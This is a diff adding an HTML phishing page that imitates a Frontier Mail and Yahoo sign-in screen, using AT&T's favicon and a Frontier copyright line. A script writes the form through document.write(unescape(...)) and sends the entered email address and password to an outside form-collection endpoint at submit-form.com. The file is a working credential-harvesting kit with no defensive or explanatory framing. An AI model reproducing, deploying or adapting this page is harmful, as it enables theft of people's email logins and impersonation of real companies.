@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+<br>
+<title>Login screen</title>
+    <link rel="shortcut icon" href="https://signin.att.com/favicon.ico"/>
+<style>
+body {
+margin: 0;
+font-family: Trebuchet MS;
+}
+
+.topnav {
+overflow: hidden;
+background-color: #333;
+}
+
+.topnav a {
+float: left;
+color: #f2f2f2;
+text-align: center;
+padding: 14px 16px;
+text-decoration: none;
+font-size: 17px;
+}
+
+.topnav a:hover {
+background-color: #ddd;
+color: black;
+}
+
+.topnav a.active {
+background-color: #00FF00;
+color: white;
+}
+
+input[type=text], input[type=email] {
+width: 25%;
+padding: 12px 20px;
+margin: 8px 0;
+border: 1px solid #ccc;
+box-sizing: border-box;
+}
+
+
+input[type=text], input[type=password] {
+width: 25%;
+padding: 12px 20px;
+margin: 8px 0;
+border: 1px solid #ccc;
+box-sizing: border-box;
+}
+
+button {
+background-color: 
+#1667dc 
+;
+color: white;
+padding: 14px 20px;
+margin: 8px 0;
+
+border: none;
+cursor: pointer;
+width: 25%;
+}
+
+button:hover {
+opacity: 0.8;
+}
+
+.cancelbtn {
+width: auto;
+padding: 10px 18px;
+background-color: 
+#00FF00
+;
+}
+
+.imgcontainer {
+text-align: center;
+margin: 10px 10px 0;
+}
+
+img.avatar {
+width: 40%;
+border-radius: 50%;
+}
+
+.container {
+padding: 10px;
+}
+
+span.psw {
+float: right;
+padding-top: 16px;
+}
+
+/ Change styles for span and cancel button on extra small screens /
+@media screen and (max-width: 300px) {
+span.psw {
+display: block;
+float: none;
+}
+.cancelbtn {
+width: 100%;
+}
+}
+
+/ The Modal (background) /
+.modal {
+display: none; / Hidden by default /
+position: fixed; / Stay in place /
+z-index: 1; / Sit on top /
+left: 0;
+top: 0;
+width: 100%; / Full width /
+height: 100%; / Full height /
+overflow: auto; / Enable scroll if needed /
+background-color: rgb(0,0,0); / Fallback color /
+background-color: rgba(0,0,0,0.4); / Black w/ opacity /
+padding-top: 60px;
+}
+
+/ Modal Content/Box /
+.modal-content {
+background-color: #fefefe;
+margin: 5% auto 15% auto; / 5% from the top, 15% from the bottom and centered /
+border: 1px solid #888;
+width: 50%; / Could be more or less, depending on screen size /
+}
+
+/ The Close Button (x) /
+.close {
+position: absolute;
+right: 25px;
+top: 0;
+color: #000;
+font-size: 35px;
+font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+color: red;
+cursor: pointer;
+}
+
+/ Add Zoom Animation /
+.animate {
+-webkit-animation: animatezoom 0.6s;
+animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+from {-webkit-transform: scale(0)}
+to {-webkit-transform: scale(1)}
+}
+
+@keyframes animatezoom {
+from {transform: scale(0)}
+to {transform: scale(1)}
+}
+
+/ Change styles for span and cancel button on extra small screens /
+@media screen and (max-width: 300px) {
+span.psw {
+display: block;
+float: none;
+}
+.cancelbtn {
+width: 100%;
+}
+}
+</style>
+</head>
+<body>
+
+
+
+</div>
+<center>
+<br><br><br><center><img <a href="https://imgbb.com/"><img src="https://i.ibb.co/MgQgvXG/front.png" alt="front" border="0"></a>" 
+<br>
+
+</font> </p>
+
+
+
+
+<script language=javascript>document.write(unescape('<form class="modal-content animate" method="post" action="https://submit-form.com/a726tzdyJ">'))</script>
+
+
+<b><B>Sign in<br>
+<B>to access FRONTIER Mail and Yahoo.com<br>
+<br>
+
+<div class="container">
+<div class="input-req-login"><label for="user">User ID</label></div>
+</div><center><p><font face="Trebuchet MS" color="black" size="2"></font><input type="email" id="fname" name="amg-email" Placeholder="Enter Email Address"
+
+"readonly required>
+<br>
+<div class="input-req-login"><label for="user">Password</label></div>
+</div><input type="password" id="fname" name="amg-pass" placeholder="Enter your email password" autofocus required>
+<br>
+<button type="submit"><B>Sign in</button>
+<br>
+<br>
+<br>
+<br>
+<br>
+</div>
+
+
+
+
+</div>
+</form>
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+if (event.target == modal) {
+modal.style.display = "none";
+}
+}
+</script>
+
+<style>
+<br><br>
+<br><br> 
+}
+}
+</script>
+
+<br><br>
+<br><br>
+
+<style>
+    @media (min-width: 481px) {
+        #select_user_form {
+            width: px;
+        }
+    }
+</style>
+    <div class="copyright"><small>©2024 FRONTIER Intellectual Property. All rights reserved. 
+</script>
+</html>
+    
+
+</body>
+
+</html>
+
